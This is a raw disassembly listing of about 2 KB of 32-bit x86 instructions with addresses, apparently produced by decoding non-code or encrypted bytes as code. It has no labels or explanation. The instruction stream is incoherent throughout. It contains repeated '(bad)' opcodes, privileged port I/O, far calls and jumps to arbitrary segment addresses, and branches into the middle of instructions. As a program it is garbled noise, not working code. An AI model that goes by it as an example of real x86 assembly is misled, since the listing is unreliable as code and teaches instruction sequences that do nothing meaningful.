  4202f7:	jge    0x420326
  4202f9:	push   ebx
  4202fa:	jne    0x4202bc
  4202fc:	fsub   QWORD PTR [eax+0x19e7187a]
  420302:	retf   
  420303:	push   edi
  420304:	fimul  DWORD PTR [edi+0x5c]
  420307:	adc    ch,bh
  420309:	add    al,0x8
  42030b:	gs je  0x2d280514
  420312:	add    al,0xce
  420314:	in     al,dx
  420315:	or     DWORD PTR [eax+edx*4+0x95e015c],ebp
  42031c:	fst    QWORD PTR [eax-0x79e31d83]
  420322:	pop    edi
  420323:	sub    al,0xe3
  420325:	mov    ch,0x42
  420327:	stc    
  420328:	sti    
  420329:	dec    edx
  42032a:	imul   ebx
  42032c:	xor    eax,DWORD PTR [esi]
  42032e:	mov    eax,0x1044da9d
  420333:	mov    edx,0x20f5b9c2
  420338:	xchg   ebp,eax
  420339:	(bad)  
  42033b:	push   ds
  42033c:	sti    
  42033d:	(bad)  
  42033e:	mov    dh,0xc6
  420340:	addr16 sub edx,eax
  420343:	mov    dl,0x42
  420345:	and    ebx,edi
  420347:	xchg   ecx,eax
  420348:	test   al,0x61
  42034b:	jmp    0x420374
  42034d:	or     cl,dh
  42034f:	xchg   esp,eax
  420350:	mov    ch,0x7
  420352:	ins    BYTE PTR es:[edi],dx
  420353:	in     al,0xb
  420355:	fs mov ecx,0xd271b9e2
  42035b:	int    0x97
  42035d:	push   esp
  42035e:	mov    ah,0x75
  420360:	(bad)
  420364:	js     0x4203bb
  420366:	cmp    DWORD PTR [ecx-0x1b],0xffffffbe
  42036a:	sbb    BYTE PTR [edx-0x56],cl
  42036d:	in     al,0xf5
  42036f:	adc    esi,DWORD PTR [edx]
  420371:	test   eax,0x5c18e620
  420376:	(bad)  
  420377:	fimul  DWORD PTR [ecx]
  420379:	xchg   ebp,eax
  42037a:	xchg   edi,eax
  42037b:	and    BYTE PTR [edx],0xd8
  42037e:	and    cl,BYTE PTR [ebp+0x2c]
  420381:	push   ss
  420382:	sahf   
  420383:	call   0x69c606be
  420388:	mov    DWORD PTR [edx+eax*2],edx
  42038b:	mov    esi,0xecc58eb2
  420390:	add    BYTE PTR [edi],dh
  420392:	jnp    0x420383
  420394:	adc    ebp,DWORD PTR [ecx]
  420396:	loope  0x420329
  420398:	ins    BYTE PTR es:[edi],dx
  420399:	sbb    DWORD PTR [edx+0x72],esp
  42039c:	dec    esp
  42039d:	xor    eax,0x16191aee
  4203a2:	sbb    al,0x54
  4203a4:	je     0x42039b
  4203a6:	pop    ds
  4203a7:	mov    al,0xf8
  4203a9:	rcl    DWORD PTR [edi+edx*4],cl
  4203ac:	push   ds
  4203ad:	(bad)  
  4203ae:	mov    cl,0x51
  4203b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203b1:	sbb    esp,eax
  4203b3:	add    al,0x7d
  4203b5:	aad    0xa8
  4203b7:	xchg   ebp,eax
  4203b8:	sbb    cl,ch
  4203ba:	imul   ebp,DWORD PTR [ecx-0x55b1f7b5],0xfffffffd
  4203c1:	dec    ebp
  4203c2:	arpl   WORD PTR [ebx],dx
  4203c4:	mov    esp,DWORD PTR ds:0x817467e5
  4203ca:	fucomip st,st(2)
  4203cc:	cmp    esp,edx
  4203ce:	lock iret 
  4203d0:	(bad)  
  4203d1:	jns    0x420439
  4203d3:	lock inc edx
  4203d5:	xor    esi,esi
  4203d7:	jno    0x420374
  4203d9:	mov    bh,0x4c
  4203db:	mov    dl,BYTE PTR [edx]
  4203dd:	xchg   ecx,eax
  4203de:	mov    al,ds:0xec458ba5
  4203e3:	push   eax
  4203e4:	mov    bl,0xe
  4203e6:	or     ecx,DWORD PTR [ecx-0x72403a14]
  4203ec:	es stos DWORD PTR es:[edi],eax
  4203ee:	fs xchg edx,eax
  4203f0:	ja     0x42045e
  4203f2:	dec    esi
  4203f3:	ja     0x4203b1
  4203f5:	push   0xc459bbaa
  4203fa:	push   ss
  4203fb:	xchg   DWORD PTR [ecx+0x3d],ecx
  4203fe:	sub    ebp,esi
  420400:	adc    DWORD PTR [edx],eax
  420402:	stos   DWORD PTR es:[edi],eax
  420403:	add    cl,bh
  420405:	mov    dl,0x8e
  420407:	repnz dec ebp
  420409:	add    BYTE PTR [edx+eiz*1-0x1dc8b85f],ah
  420410:	addr16 (bad) 
  420412:	stos   DWORD PTR es:[edi],eax
  420413:	addr16 int 0x10
  420416:	in     eax,0x3c
  420418:	icebp  
  420419:	fnstsw WORD PTR [esi]
  42041b:	jb     0x420417
  42041d:	push   ebp
  42041e:	or     edi,edi
  420420:	retf   0xc704
  420423:	cmp    dl,BYTE PTR [ebp-0x17]
  420426:	mov    eax,0x59b64e8a
  42042b:	mov    esp,0x8b80d90e
  420430:	repnz shl DWORD PTR [ecx],1
  420433:	(bad)  
  420435:	je     0x4203cc
  420437:	ins    DWORD PTR es:[edi],dx
  420438:	nop
  420439:	xlat   BYTE PTR ds:[ebx]
  42043a:	or     eax,0xb834199d
  42043f:	mov    al,0xfb
  420441:	shl    DWORD PTR ds:0xe64cfbee,cl
  420447:	jo     0x420418
  420449:	mov    WORD PTR [eax+0x4d119182],?
  42044f:	in     eax,dx
  420450:	arpl   bx,bx
  420452:	rol    DWORD PTR [esi+0x6b2dd4c],1
  420458:	push   ds
  420459:	sbb    BYTE PTR [ebx+0x6],0x45
  42045d:	sub    al,0xf2
  42045f:	jns    0x420445
  420461:	sub    al,0xa2
  420463:	mov    ebx,0xc0c9a5ce
  420468:	push   esp
  420469:	aad    0x43
  42046b:	bound  ebp,QWORD PTR [eax]
  42046d:	pop    es
  42046e:	in     al,dx
  42046f:	push   cs
  420470:	fs aad 0x55
  420473:	add    edx,DWORD PTR [esi-0x2b]
  420476:	or     DWORD PTR [edx],ebx
  420478:	mov    edi,0xbeb59fb8
  42047d:	push   0x846ebaac
  420482:	xor    BYTE PTR [eax],dl
  420484:	push   es
  420485:	adc    eax,0x4fce391a
  42048a:	ins    DWORD PTR es:[edi],dx
  42048b:	xor    al,BYTE PTR [edi+0x2a]
  42048e:	loopne 0x420495
  420490:	mov    dl,0x49
  420492:	cli    
  420493:	inc    esp
  420494:	retf   
  420495:	push   eax
  420496:	pushf  
  420497:	aad    0x89
  420499:	jno    0x420516
  42049b:	shr    DWORD PTR [ebx+0x61],1
  42049e:	jbe    0x42050c
  4204a0:	loop   0x4204e4
  4204a2:	cmp    cl,ch
  4204a4:	les    ecx,FWORD PTR [edx+0x4]
  4204a7:	aad    0x1c
  4204a9:	jae    0x4204af
  4204ab:	push   ecx
  4204ac:	push   cs
  4204ad:	ror    ebp,0x12
  4204b0:	out    dx,al
  4204b1:	push   esp
  4204b2:	in     al,0x20
  4204b4:	mov    DWORD PTR [eax],esp
  4204b6:	and    eax,edi
  4204b8:	popa   
  4204b9:	fwait
  4204ba:	movq   QWORD PTR [edx+esi*2+0x39],mm5
  4204bf:	mov    ecx,DWORD PTR [edi+0x3e]
  4204c2:	icebp  
  4204c3:	clc    
  4204c4:	cmp    al,0x7e
  4204c6:	mov    cl,0xa5
  4204c8:	and    cl,BYTE PTR [ecx]
  4204ca:	dec    esi
  4204cb:	ret    0xd27f
  4204ce:	pushf  
  4204cf:	cs stc 
  4204d1:	lods   al,BYTE PTR ds:[esi]
  4204d2:	mov    ds:0x84fdbf15,al
  4204d7:	int    0x7c
  4204d9:	aam    0xad
  4204db:	ds in  al,dx
  4204dd:	push   0x8b388a93
  4204e2:	hlt    
  4204e3:	push   ebp
  4204e4:	jg     0x4204d5
  4204e6:	pushf  
  4204e7:	mov    ds:0x93263740,eax
  4204ec:	push   ebp
  4204ed:	cvtps2pi mm7,xmm0
  4204f0:	in     eax,0x79
  4204f2:	or     eax,DWORD PTR [edi-0x1507e738]
  4204f8:	mov    eax,ds:0xe49dabea
  4204fd:	sahf   
  4204fe:	ss jge 0x4204dd
  420501:	jg     0x420567
  420503:	xchg   ebp,eax
  420504:	adc    bh,BYTE PTR ds:0x6450f0f5
  42050a:	das    
  42050b:	push   ebp
  42050c:	mov    ebp,0x343689e9
  420511:	ret    
  420512:	in     eax,dx
  420513:	pop    ecx
  420514:	ror    BYTE PTR [edx+ecx*8+0x3bffbe0d],0xc6
  42051c:	scas   eax,DWORD PTR es:[edi]
  42051d:	mov    DWORD PTR [ecx-0x7990d540],0xf50bc234
  420527:	add    al,0x29
  420529:	lds    ebp,FWORD PTR [edx+eax*1]
  42052c:	aam    0xa2
  42052e:	cmc    
  42052f:	pop    DWORD PTR [ecx+0x4f]
  420532:	lea    edi,[eax+0x1114b905]
  420538:	jmp    0x4204f7
  42053a:	adc    DWORD PTR [ebp+eiz*2+0x5e],edx
  42053e:	bound  ecx,QWORD PTR [ecx+0x26]
  420541:	rol    dh,1
  420543:	sub    bh,BYTE PTR [eax+0x3f5a95a]
  420549:	lods   eax,DWORD PTR ds:[esi]
  42054a:	and    al,0x29
  42054c:	mov    esi,0x5eca531
  420551:	add    cl,ch
  420553:	mov    ebp,0x75408dfc
  420558:	call   0xb885:0x4a29ac87
  42055f:	adc    al,0x1b
  420561:	in     eax,dx
  420562:	rcl    BYTE PTR [esi-0x5786cfc8],cl
  420568:	aas    
  420569:	mov    al,0xb6
  42056b:	daa    
  42056c:	call   eax
  42056e:	inc    edi
  42056f:	loope  0x42054b
  420571:	push   ebx
  420572:	pop    es
  420573:	and    dh,bh
  420575:	mov    ebp,0xc7e59c5d
  42057a:	or     DWORD PTR [ebp-0x5d],eax
  42057d:	mov    eax,0xdf85afaa
  420582:	mov    ds:0x9d4751df,al
  420587:	stos   BYTE PTR es:[edi],al
  420588:	cmp    eax,0xaa66762b
  42058d:	and    DWORD PTR [esi+eax*1+0x2c9a0524],esi
  420594:	push   ebp
  420595:	out    dx,eax
  420596:	(bad)  
  420597:	fld    DWORD PTR [edi]
  420599:	cmp    BYTE PTR [esi+0x510acb7],al
  42059f:	shr    DWORD PTR [ebx+ebx*2-0x1a980ca2],0xc2
  4205a7:	add    DWORD PTR [esi],esp
  4205a9:	push   eax
  4205aa:	aaa    
  4205ab:	xlat   BYTE PTR ds:[ebx]
  4205ac:	dec    edi
  4205ae:	mov    ebx,0xa67c9d72
  4205b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205b4:	sub    DWORD PTR [edi+edx*1],ebp
  4205b7:	sub    eax,0x9cf42ef8
  4205bc:	je     0x4205de
  4205be:	ror    BYTE PTR [edx+0x7d],cl
  4205c1:	repnz add al,dl
  4205c4:	adc    eax,0xca18614a
  4205c9:	sar    BYTE PTR [ecx-0x4d825fb],0xbe
  4205d0:	or     al,0xd8
  4205d2:	in     eax,0xe6
  4205d4:	leave  
  4205d5:	add    DWORD PTR [edx-0x68],ebp
  4205d8:	cmp    eax,0x93294a09
  4205dd:	cmc    
  4205de:	bound  ecx,QWORD PTR [eax-0x6d7b350d]
  4205e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205e5:	sub    ch,BYTE PTR [edx+0x68]
  4205e8:	jae    0x42058f
  4205ea:	sbb    esp,ecx
  4205ec:	add    ebx,DWORD PTR [edi+0x413e3293]
  4205f2:	mov    DWORD PTR [ebx+eiz*4+0x17],eax
  4205f6:	in     eax,dx
  4205f7:	aam    0x91
  4205f9:	jl     0x42059b
  4205fb:	cwde   
  4205fc:	ins    BYTE PTR es:[edi],dx
  4205fd:	xchg   edi,eax
  4205fe:	shr    BYTE PTR [edi+0x2a],1
  420601:	daa    
  420602:	adc    DWORD PTR [edx-0xca74051],ebx
  420608:	in     al,0x3e
  42060a:	add    ecx,DWORD PTR [ebx]
  42060c:	daa    
  42060d:	push   edx
  42060e:	icebp  
  42060f:	jno    0x4205d8
  420611:	ja     0x42068b
  420613:	dec    ebp
  420614:	xchg   edx,eax
  420615:	les    edi,FWORD PTR [ebp+0x376748f8]
  42061b:	imul   DWORD PTR [ebx+0x7e54338b]
  420621:	add    ebx,DWORD PTR [ebp-0xa]
  420624:	fiadd  DWORD PTR [edx]
  420626:	xor    ebx,DWORD PTR [edi+0x4dfd9fc]
  42062c:	mov    ds:0x67399ed1,eax
  420631:	cmp    al,BYTE PTR [esi]
  420633:	xor    eax,0xd6b244e7
  420638:	mov    eax,0x3da979ef
  42063d:	loop   0x4205eb
  42063f:	int3   
  420640:	add    ecx,DWORD PTR [ecx+edx*2+0x16]
  420644:	cmp    eax,0xd1ec0b76
  420649:	push   0xffffffbd
  42064b:	pop    ecx
  42064c:	retf   
  42064d:	xor    DWORD PTR ds:0xd57ddf90,esp
  420653:	and    eax,0xc8b32894
  420658:	cmp    BYTE PTR [edi-0x73d4f5a],ah
  42065e:	and    dl,cl
  420660:	mov    ecx,0x5caf7e13
  420665:	inc    esp
  420666:	arpl   WORD PTR [edx],bx
  420668:	pop    ds
  420669:	in     eax,0x5f
  42066b:	call   0x244e:0x29ab996b
  420672:	dec    edi
  420673:	push   esi
  420674:	popf   
  420675:	xor    BYTE PTR [ecx+0x11],cl
  420678:	adc    al,0x81
  42067a:	fld    TBYTE PTR [ebp-0x1c]
  42067d:	imul   edx,ebp,0x6890dc84
  420683:	adc    eax,0xa3b4c3aa
  420688:	xor    al,0xda
  42068a:	pop    eax
  42068b:	xor    ah,BYTE PTR [edi]
  42068d:	loop   0x4206a3
  42068f:	in     eax,dx
  420690:	push   0x6f
  420692:	aad    0xdc
  420694:	jno    0x4206e6
  420696:	das    
  420697:	repnz aam 0x3d
  42069a:	stos   BYTE PTR es:[edi],al
  42069b:	sti    
  42069c:	mov    ecx,0xbf40b065
  4206a1:	fidivr DWORD PTR [edx+0x502d8b09]
  4206a7:	push   edx
  4206a8:	mov    ds:0xd1af25d9,al
  4206ad:	mov    ebx,0x9c2fd613
  4206b2:	mov    edi,0x536c2725
  4206b7:	or     esi,eax
  4206b9:	jnp    0x420673
  4206bb:	fwait
  4206bc:	xor    DWORD PTR [edi+0x11],edx
  4206bf:	xchg   ebx,eax
  4206c0:	dec    eax
  4206c1:	and    dl,0xcf
  4206c4:	imul   esi,DWORD PTR [ecx],0xc
  4206c7:	jne    0x42066d
  4206c9:	and    eax,0xdab8c863
  4206ce:	and    eax,0xe09af283
  4206d3:	(bad)  
  4206d4:	mov    ch,0x8b
  4206d6:	data16 (bad) 
  4206d8:	mov    al,ds:0x720693bf
  4206dd:	inc    esi
  4206de:	push   edx
  4206df:	mov    bl,BYTE PTR [ebp-0x4f]
  4206e2:	arpl   WORD PTR [edi],cx
  4206e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206e5:	or     BYTE PTR [esi+0x4b8e8662],bl
  4206eb:	add    bh,bl
  4206ed:	test   al,0x8e
  4206ef:	jno    0x42068c
  4206f1:	ss int3 
  4206f3:	mov    fs,WORD PTR [ebp-0x3d]
  4206f6:	aaa    
  4206f7:	loopne 0x4206bd
  4206f9:	cmp    DWORD PTR [esi+0x7a],edi
  4206fc:	jns    0x420685
  4206fe:	pop    ecx
  4206ff:	cli    
  420700:	pop    ebp
  420701:	test   al,0x1d
  420703:	out    dx,eax
  420704:	xor    eax,0x6b5627fe
  420709:	sbb    DWORD PTR ds:0xe14d5528,esp
  42070f:	xchg   edx,eax
  420710:	cwde   
  420711:	imul   esp,DWORD PTR ds:0x4984e275,0xcf7c72e7
  42071b:	inc    esi
  42071c:	test   al,0xda
  42071e:	jp     0x420733
  420720:	jmp    0x44cc:0x3ff120af
  420727:	arpl   WORD PTR [eax-0x6a],dx
  42072a:	xchg   esp,eax
  42072b:	out    0x76,eax
  42072d:	ror    DWORD PTR [eax],0x27
  420730:	mov    ebp,0x26fb96a4
  420735:	adc    eax,0x8180f688
  42073a:	rcr    BYTE PTR [esi+0x4a],0x44
  42073e:	sbb    eax,DWORD PTR [eax+eax*4]
  420741:	loope  0x420725
  420743:	por    mm3,QWORD PTR [ebx+0x7f]
  420747:	mov    al,0xc0
  420749:	xchg   BYTE PTR [esi+0x78a03bac],bh
  42074f:	fisubr WORD PTR [edi+0x412a1df9]
  420755:	and    al,0x14
  420757:	and    dh,0x24
  42075a:	mov    bl,0x5e
  42075c:	lahf   
  42075d:	test   DWORD PTR [edx],esi
  42075f:	pop    ebx
  420760:	test   BYTE PTR [edi-0x782d53f],0xbf
  420767:	daa    
  420768:	adc    ebx,DWORD PTR [ebp+eax*1+0x60c3aec]
  42076f:	(bad)
  420772:	sti    
  420773:	lods   al,BYTE PTR ds:[esi]
  420774:	add    ch,BYTE PTR [esp+eiz*2]
  420777:	and    al,0x26
  420779:	cld    
  42077a:	push   edx
  42077b:	mov    esi,0xa4889c
  420780:	ret    0xd2cc
  420783:	int3   
  420784:	fiadd  DWORD PTR [ebp+0x25]
  420787:	lods   al,BYTE PTR ds:[esi]
  420788:	lock sub al,0xb4
  42078b:	xor    al,0x3f
  42078d:	fst    DWORD PTR [edx]
  42078f:	mov    ecx,0xf18500aa
  420794:	lods   eax,DWORD PTR ds:[esi]
  420795:	clc    
  420796:	cmc    
  420797:	jp     0x4207b7
  420799:	cmp    dl,ah
  42079b:	add    esp,DWORD PTR ds:0x6a817f96
  4207a1:	pusha  
  4207a2:	addr16 lahf 
  4207a4:	jno    0x42075f
  4207a6:	mov    edi,0x3a79e349
  4207ab:	pop    ebx
  4207ac:	les    eax,FWORD PTR [edx-0x1733c038]
  4207b2:	ror    DWORD PTR [ecx+0x5e],0xbf
  4207b6:	add    DWORD PTR [ebx+0x2831ce46],ecx
  4207bc:	add    DWORD PTR [edx+0x74178783],0xda52bab9
  4207c6:	les    edi,FWORD PTR [edi-0x48]
  4207c9:	dec    edi
  4207ca:	sar    BYTE PTR [edi],cl
  4207cc:	je     0x420833
  4207ce:	bound  ebx,QWORD PTR [edx+0x55]
  4207d1:	or     cl,BYTE PTR [edx-0x52]
  4207d4:	and    dh,BYTE PTR cs:[edx+0x7a]
  4207d8:	in     eax,dx
  4207d9:	jne    0x4207bc
  4207db:	fcomp  QWORD PTR [edi-0x1a]
  4207de:	pushf  
  4207df:	xchg   edi,eax
  4207e0:	test   al,0xd6
  4207e2:	xchg   ebx,eax
  4207e3:	add    DWORD PTR [edi],ebp
  4207e5:	aad    0xe1
  4207e7:	xchg   esi,eax
  4207e8:	and    edx,DWORD PTR [eax+0x7dc557e8]
  4207ee:	aaa    
  4207ef:	test   BYTE PTR [ebx+0x75],ch
  4207f2:	xor    BYTE PTR [edx],bh
  4207f4:	or     DWORD PTR [edi-0xcef535c],0x90d3c125
  4207fe:	sar    BYTE PTR [eax+ebp*4],0x9b
  420802:	sbb    al,bl
  420804:	xchg   ebx,eax
  420805:	xchg   DWORD PTR [ebp-0x64f71a5f],edi
  42080b:	mov    BYTE PTR [edx+0x3c408ca9],al
  420811:	stos   DWORD PTR es:[edi],eax
  420812:	neg    ah
  420814:	jl     0x42081f
  420816:	mov    cl,0xe9
  420818:	and    eax,esp
  42081a:	cmc    
  42081b:	jp     0x420890
  42081d:	in     eax,0x35
  42081f:	mov    esp,DWORD PTR [ecx+0x74]
  420822:	inc    ebx
  420823:	xor    al,0x4d
  420825:	pushf  
  420826:	xor    edi,DWORD PTR [edx-0x3fb663c9]
  42082c:	test   eax,0x43f50305
  420831:	out    0x96,al
  420833:	push   edi
  420834:	xor    ah,BYTE PTR [edx+0x12]
  420837:	pusha  
  420838:	mov    bl,0x5d
  42083a:	adc    cl,ch
  42083c:	popf   
  42083d:	xchg   esp,eax
  42083e:	cmp    al,0xd1
  420840:	dec    edi
  420841:	call   FWORD PTR [ebx-0x5b]
  420844:	repz adc edi,ebp
  420847:	in     al,0xc2
  420849:	mov    bh,0x47
  42084b:	and    al,0xf
  42084d:	sbb    dh,BYTE PTR [esi+edi*2-0x4c]
  420851:	xchg   esi,eax
  420852:	daa    
  420853:	aas    
  420854:	mov    ch,0xcd
  420856:	(bad)  
  420857:	sbb    esi,DWORD PTR [ecx-0x37]
  42085a:	cmp    edi,DWORD PTR [edx]
  42085c:	iret   
  42085d:	xor    eax,0x82ec35c3
  420862:	push   0xe464c971
  420867:	jecxz  0x42085e
  420869:	add    eax,0x726fd6f0
  42086e:	dec    esi
  42086f:	inc    ecx
  420870:	xlat   BYTE PTR ds:[ebx]
  420871:	or     al,0x7c
  420873:	jbe    0x420854
  420875:	jl     0x42083a
  420877:	jo     0x420825
  420879:	cwde   
  42087a:	out    dx,eax
  42087b:	test   al,0x7c
  42087d:	fcmovnu st,st(2)
  42087f:	in     al,dx
  420880:	adc    ah,dl
  420882:	inc    ecx
  420883:	mov    ebp,0x51ac7511
  420888:	push   ebx
  420889:	adc    dh,BYTE PTR [ebp-0xd]
  42088c:	sub    eax,0xf5ecbc2e
  420891:	scas   al,BYTE PTR es:[edi]
  420892:	add    eax,0xee4b6f3b
  420897:	cmp    eax,0x3014183
  42089c:	fidiv  DWORD PTR [ebp+esi*4+0x76]
  4208a0:	xchg   ebx,eax
  4208a1:	das    
  4208a2:	inc    esp
  4208a3:	adc    dh,BYTE PTR [ebx-0x4c]
  4208a6:	inc    ecx
  4208a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208a8:	add    ebp,eax
  4208aa:	inc    esp
  4208ab:	or     BYTE PTR [ebx+0x452e123c],bl
  4208b1:	push   ds
  4208b2:	cwde   
  4208b3:	jp     0x420864
  4208b5:	imul   esi,esp,0x5c
  4208b8:	int3   
  4208b9:	gs dec ecx
  4208bb:	sub    ebp,ecx
  4208bd:	add    al,0xd7
  4208bf:	in     eax,dx
  4208c0:	mov    edi,0x5450ef2b
  4208c5:	(bad)  
  4208c6:	mov    ecx,0xbf7f7cda
  4208cb:	jge    0x4208fd
  4208cd:	fidiv  DWORD PTR [ebx+0x1a07f2da]
  4208d3:	pop    es
  4208d4:	xchg   edx,eax
  4208d5:	mov    edi,0x3fd0c09d
  4208da:	xlat   BYTE PTR es:[ebx]
  4208dc:	xor    al,0x45
  4208de:	lea    esp,[eax-0x213e1001]
  4208e4:	outs   dx,DWORD PTR ds:[esi]
  4208e5:	dec    eax
  4208e6:	test   DWORD PTR [ecx+0x56424578],edi
  4208ec:	or     DWORD PTR [esi+0x62549aa1],edx
  4208f2:	sbb    BYTE PTR [ecx+ebx*2+0x43a7a5cf],dh
  4208f9:	aas    
  4208fa:	call   0x4e43:0xd2dcd948
  420901:	out    dx,al
  420902:	scas   al,BYTE PTR es:[edi]
  420903:	pop    ds
  420904:	inc    esi
  420905:	(bad)  
  420906:	cmp    DWORD PTR fs:[edx+0x34784b30],esp
  42090d:	aaa    
  42090e:	dec    esi
  42090f:	cld    
  420910:	(bad)  
  420911:	cmp    esi,DWORD PTR [edi+edi*8]
  420914:	popa   
  420915:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420917:	cdq    
  420918:	sbb    esi,esp
  42091a:	mov    ds:0xf8a36cb1,al
  42091f:	and    ecx,DWORD PTR [ecx]
  420921:	dec    ebp
  420922:	push   ebx
  420923:	jmp    0x42097c
  420925:	sub    eax,0x7517aeba
  42092a:	pop    esi
  42092b:	mov    bl,0xa1
  42092d:	jbe    0x42092f
  42092f:	pop    es
  420930:	sbb    dl,dh
  420932:	dec    ebx
  420933:	or     edi,DWORD PTR [edx-0x26]
  420936:	out    0x12,al
  420938:	push   cs
  420939:	xchg   esi,eax
  42093a:	sar    DWORD PTR [eax-0x8],1
  42093d:	fcomp  DWORD PTR [edx-0x3d565b35]
  420943:	retf   
  420944:	dec    ebp
  420945:	cli    
  420946:	mov    ah,0xc7
  420948:	fwait
  420949:	in     al,0xf0
  42094b:	in     eax,0xf6
  42094d:	xchg   ebx,eax
  42094e:	in     eax,0x12
  420950:	or     edx,DWORD PTR [ebx]
  420952:	or     ebp,DWORD PTR [ecx+0x5470f088]
  420958:	inc    eax
  420959:	fucompp 
  42095b:	or     eax,0xe043798a
  420960:	add    esi,edx
  420962:	add    DWORD PTR [esi],ecx
  420964:	lods   eax,DWORD PTR ds:[esi]
  420965:	ins    DWORD PTR es:[edi],dx
  420966:	int    0x25
  420968:	mov    BYTE PTR [eax+0x29233c34],bl
  42096e:	sub    dh,BYTE PTR [ebp+0x3f9849c4]
  420974:	ins    DWORD PTR es:[edi],dx
  420975:	xchg   ebp,eax
  420976:	push   edi
  420977:	adc    esi,ecx
  420979:	out    dx,eax
  42097a:	mov    al,0x8
  42097c:	push   esi
  42097d:	gs dec ecx
  42097f:	cmp    bh,BYTE PTR [ebp+0x26b11936]
  420985:	(bad)  
  420986:	cmp    ch,bh
  420988:	int3   
  420989:	in     al,dx
  42098a:	loop   0x4209e6
  42098c:	add    dl,dl
  42098e:	int    0x69
  420990:	mov    ah,0x4b
  420992:	mov    esp,0x3d110859
  420997:	stos   BYTE PTR es:[edi],al
  420998:	xor    eax,0xf2cd4a4e
  42099d:	out    0x4d,eax
  42099f:	shl    ecx,0xed
  4209a2:	cli    
  4209a3:	and    al,0x8d
  4209a5:	lods   al,BYTE PTR ds:[esi]
  4209a6:	cmp    DWORD PTR [ebx+0x26],0x71c5d3a1
  4209ad:	test   BYTE PTR [eax-0x3c582de1],0x6f
  4209b4:	xchg   edx,eax
  4209b5:	or     BYTE PTR [ecx],ch
  4209b7:	sti    
  4209b8:	ins    BYTE PTR es:[edi],dx
  4209b9:	push   eax
  4209ba:	mov    ecx,0x924a0c28
  4209bf:	mov    BYTE PTR [esi-0x14],dl
  4209c2:	sub    BYTE PTR es:[edx+ebx*1-0x21f0203e],bh
  4209ca:	add    edi,ecx
  4209cc:	fdivr  QWORD PTR [ebp-0x5bde044c]
  4209d2:	cld    
  4209d3:	fstp   TBYTE PTR [edx+0x53]
  4209d6:	add    DWORD PTR [ebx+eiz*8-0x2047c47c],esi
  4209dd:	or     eax,0xa5d71e81
  4209e2:	adc    BYTE PTR [ebx],al
  4209e4:	push   0xffffffc8
  4209e6:	jnp    0x4209c4
  4209e8:	stos   BYTE PTR es:[edi],al
  4209e9:	push   0x27
  4209eb:	(bad)  
  4209ec:	sub    ah,BYTE PTR [ebp+0x6b]
  4209ef:	jae    0x420a50
  4209f1:	mov    gs,WORD PTR [eax-0x34ec944e]
  4209f7:	pusha  
  4209f8:	xchg   ebp,eax
  4209f9:	dec    ecx
  4209fa:	sub    eax,0x4b35f4f0
  4209ff:	pop    esp
  420a00:	stos   BYTE PTR es:[edi],al
  420a01:	lock jns 0x420a1e
  420a04:	push   edi
  420a05:	push   esp
  420a06:	inc    edx
  420a07:	or     al,BYTE PTR [ebx+ecx*4-0x1]
  420a0b:	or     eax,0xf6297b
  420a10:	aaa    
  420a11:	fdiv   DWORD PTR [ecx]
  420a13:	push   cs
  420a14:	popf   
  420a15:	leave  
  420a16:	out    dx,eax
  420a17:	xor    al,BYTE PTR ds:0xcdb235f9
  420a1d:	rcr    BYTE PTR [eax+0x1a],cl
  420a20:	ds jnp 0x420a46
  420a23:	test   BYTE PTR [esi-0x9545ae4],cl
  420a29:	sbb    al,al
  420a2b:	ret    0x9943
  420a2e:	sbb    eax,0xedb7f5e3
  420a33:	shr    DWORD PTR [esi+0x37780b0e],0xd6
  420a3a:	je     0x4209f6
  420a3c:	(bad)  
  420a3d:	fisttp WORD PTR [esi-0x51f64062]
  420a43:	add    ah,0xf3
  420a46:	sbb    al,0x2
  420a48:	popf   
  420a49:	add    esi,DWORD PTR [edx+0x3e]
  420a4c:	test   al,0xfe
  420a4e:	xor    eax,0x4226ed6e
  420a53:	cmp    edi,DWORD PTR [edi+0x1fd8545b]
  420a59:	sub    bh,BYTE PTR [eax+0x24ecfd25]
  420a5f:	mov    eax,ds:0x7a89a784
  420a64:	push   esi
  420a65:	icebp  
  420a66:	xchg   DWORD PTR [di-0x263c],esi
  420a6b:	in     al,0x53
  420a6d:	fiadd  WORD PTR [edi+0x20]
  420a70:	test   eax,0xed8516d4
  420a75:	mov    cl,BYTE PTR [eax-0x2f5f6d40]
  420a7b:	mov    edi,DWORD PTR [eax-0x10]
  420a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a7f:	xlat   BYTE PTR gs:[ebx]
  420a81:	ss mov eax,edi
  420a84:	mov    eax,ds:0x62467b98
  420a89:	push   ss
  420a8a:	mov    eax,ds:0x6ea14106
  420a8f:	mov    eax,0x5bf014ac
  420a94:	and    esi,esi
  420a96:	cmp    bl,BYTE PTR [ebx-0x7f13d6b2]
  420a9c:	mov    ch,0xec
  420a9e:	cdq    
  420a9f:	pop    eax
  420aa0:	mov    al,0x32
  420aa2:	push   cs
  420aa3:	xchg   DWORD PTR [ebp+0x7c],esp
  420aa6:	or     al,0xd0
  420aa8:	mov    ecx,0x603f2c13
  420aad:	fst    QWORD PTR [ecx]
  420aaf:	sbb    DWORD PTR [ebx],edx
  420ab1:	mov    ss,WORD PTR [eax+ebp*2+0x76]
  420ab5:	or     eax,0xd1b3cb7c
  420aba:	cmp    al,0xd3
  420abc:	xchg   edi,eax
  420abd:	mov    ecx,0x7c99d132
  420ac2:	push   edi
  420ac3:	ret    
  420ac4:	mov    al,ds:0xa1cc7c5b
  420ac9:	inc    ebp
  420aca:	or     BYTE PTR [esi],cl
  420acc:	pop    ebx
  420acd:	inc    esi
  420ace:	leave  
  420acf:	icebp  
  420ad0:	(bad)  
  420ad1:	pop    eax
  420ad2:	aas    
  420ad3:	js     0x420b2f
  420ad5:	popa   
  420ad6:	jae    0x420b3e
  420ad8:	xor    al,dh
  420ada:	jle    0x420a90
  420adc:	icebp  
  420add:	retf   0x9644
  420ae0:	xor    BYTE PTR [esi+0x770b3c67],dh
  420ae6:	sbb    DWORD PTR ds:[eax+0x76],esi
  420aea:	js     0x420b58
  420aec:	in     al,0xab
  420aee:	sbb    DWORD PTR [edi+0x2b],0xffffffa8
  420af2:	es jmp 0x1376650f
  420af8:	mov    eax,ds:0xc00483ba
  420afd:	cwde   
  420afe:	pop    es
  420aff:	addr16 aas 
